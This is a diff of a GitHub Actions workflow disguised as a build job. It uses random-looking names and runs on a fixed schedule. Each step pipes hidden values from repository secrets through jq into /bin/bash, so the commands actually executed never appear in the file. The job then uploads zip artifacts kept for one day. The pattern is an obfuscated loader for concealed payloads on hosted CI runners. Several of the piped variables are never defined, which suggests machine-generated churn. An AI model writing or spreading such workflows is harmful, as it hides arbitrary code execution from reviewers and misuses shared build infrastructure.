@@ -1,27 +1,28 @@
 name: yinxinruizhong
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '57 0/6 * * *'
 
-jobs:  # 31367
+  schedule:
+    - cron: '25 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yinxinruizhong
         env:
-          oaw30041: ${{ secrets.oaw30041 }}
+          lfrj23603: ${{ secrets.lfrj23603 }}
         run: |
-          echo $oaw30041 | jq -r .hhpcj293 | /bin/bash
-          echo $uvhh84 | jq -r .v769 | /bin/bash
-          echo $sbdfl60 | jq -r .tbtbw946 | /bin/bash
-          echo $pnfnm2891 | jq -r .t9 | /bin/bash
-          echo $svc06444 | jq -r .qyhg18 | /bin/bash
-          echo $qd4874 | jq -r .o34208 | /bin/bash
-          echo $a2 | jq -r .du3000 | /bin/bash
-          echo $u05 | jq -r .ntcv68 | /bin/bash
-          echo $wsjs7 | jq -r .odou74873 | /bin/bash
-          echo $yg1537 | jq -r .e6 | /bin/bash
+          printf '%s' "$lfrj23603" | jq -r .vvp4 | /bin/bash
+          echo $vix13 | jq -r .neab27924 | /bin/bash
+          printf '%s' "$o907" | jq -r .hda934 | /bin/bash
+          printf '%s' "$e1" | jq -r .ozire05524 | /bin/bash
+          echo $l11 | jq -r .yjvql0 | /bin/bash
+          echo $l93 | jq -r .vftl31 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: AvsM2lo6
+          path: "*.zip"
+          retention-days: 1
